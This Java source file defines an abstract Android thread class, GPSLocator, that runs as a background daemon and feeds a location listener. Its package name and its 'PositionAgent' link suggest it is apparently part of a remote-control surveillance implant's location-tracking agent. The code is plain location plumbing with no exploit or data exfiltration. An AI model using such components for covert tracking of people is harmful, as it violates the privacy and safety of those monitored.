package com.ht.RCSAndroidGUI.agent.position;

import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.agent.PositionAgent;

import android.content.Context;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Looper;
import android.util.Log;

public abstract class GPSLocator extends Thread {

	private static final String TAG = "GPSLocator";
	private LocationManager lm;
	private LocationListener listener;


	Looper myLooper;

	private GPSLocator() {
		setDaemon(true);
		setName("LocationThread");
	}

	
	public GPSLocator(LocationListener listener) {
		this();
		this.listener = listener;
		lm = (LocationManager) Status.getAppContext().getSystemService(
				Context.LOCATION_SERVICE);

	}

	public abstract void go(LocationListener listener, LocationManager lm);
	
	public void run() {
		Looper.prepare();
		go(listener,lm);
		myLooper = Looper.myLooper();
		Looper.loop();
		Log.d(TAG, "exiting");
	}

	public void halt() {
		lm.removeUpdates(listener);
		if (myLooper != null) {
			myLooper.quit();
		}
		lm = null;
	}
}